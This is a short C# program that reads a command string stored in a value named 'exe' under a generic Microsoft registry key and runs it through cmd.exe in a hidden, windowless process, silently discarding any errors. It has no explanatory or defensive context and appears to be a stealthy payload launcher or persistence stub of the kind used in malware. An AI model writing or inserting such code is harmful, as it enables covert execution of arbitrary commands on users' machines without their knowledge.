using Microsoft.Win32;
using System;
using System.Diagnostics;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            var exe = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft").GetValue("exe").ToString();
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", string.Format("/K {0}", exe)) { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden } }.Start();
        }
        catch (Exception e) { }
    }
}